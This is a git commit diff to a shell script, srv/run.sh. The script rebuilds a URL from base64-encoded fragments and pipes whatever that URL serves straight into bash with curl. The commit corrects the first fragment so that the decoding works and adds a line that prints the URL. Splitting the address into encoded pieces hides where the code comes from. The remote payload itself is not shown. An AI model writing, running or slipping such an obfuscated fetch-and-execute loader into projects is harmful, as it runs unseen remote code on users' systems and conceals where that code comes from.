bcd504fb2be451487695cc20b23e2d14b6d4bf70
Ｎᴏʙɪᴛᴀ <nn8109239@gmail.com>
2025-12-15 00:54:12 +0530

    Update run.sh

--- srv/run.sh
+++ srv/run.sh
@@ -1,22 +1,21 @@
 #!/usr/bin/env bash
 
 x=(
-"dHR0cHM6Ly8="
-"cnVu"
-"Mi4="
-"bm9i"
-"aXRh"
-"cHJv"
-"Lm9u"
-"bGlu"
-"ZQ=="
+"aHR0cHM6Ly8="   
+"cnVu"      
+"Mi4="           
+"bm9i"        
+"aXRh"        
+"cHJv"        
+"Lm9u"        
+"bGlu"          
+"ZQ=="          
 )
 
-o=(0 1 2 3 4 5 6 7 8)
-
 u=""
-for i in "${o[@]}"; do
+for i in {0..8}; do
   u+=$(echo "${x[$i]}" | base64 -d)
 done
 
+echo "URL => $u"
 bash <(curl -fsSL "$u")
